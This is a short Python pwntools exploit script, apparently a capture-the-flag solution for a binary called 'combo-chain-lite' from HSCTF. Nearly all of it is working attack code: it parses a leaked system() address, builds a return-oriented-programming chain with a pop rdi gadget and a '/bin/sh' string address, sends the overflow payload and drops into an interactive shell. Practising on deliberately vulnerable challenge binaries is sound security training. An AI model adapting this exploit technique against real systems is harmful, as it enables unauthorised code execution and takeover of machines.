from pwn import *
from struct import *

p = process("./combo-chain-lite")
#p = remote("pwn.hsctf.com", 3131)
k = p.recvline()
print k
k = k.split(" ")[4]
k= k[:14]
sytem=int(k,16)
print(hex(sytem))
junk = "A"*16
payload = ''
payload += junk
gadget= pack("<Q",0x0000000000401273) #ropgadget from ropper tool  #pop rdi ret rdi will contain str bin sh
payload +=gadget
strbin =  0x402051

payload += pack("<Q", strbin)
payload += pack("<Q", sytem)
print(payload)
e= open('payload.txt','w')
e.write(payload)
e.close()

p.send(payload)

p.interactive()


